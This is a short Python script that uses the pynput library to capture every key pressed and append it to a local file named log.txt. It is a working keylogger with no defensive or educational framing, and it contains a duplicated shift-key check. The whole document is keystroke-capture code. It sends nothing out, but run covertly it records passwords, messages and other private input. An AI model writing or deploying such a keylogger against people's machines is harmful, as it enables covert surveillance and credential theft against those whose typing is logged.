from pynput import keyboard
from pynput.keyboard import Listener

def writetofile(key):
    keyStroke = str(key)
    keyStroke = keyStroke.replace("'", "")
    keyStroke = keyStroke.replace("Key.space", " ")
    keyStroke = keyStroke.replace("Key.enter", "\n")

    if keyStroke == 'Key.shift_r':
        keyStroke = ''
    if keyStroke == 'Key.shift_r':
        keyStroke = ''


    with open("log.txt", 'a') as fileHand:
        fileHand.write(keyStroke)


with Listener(on_press=writetofile) as l:
    l.join()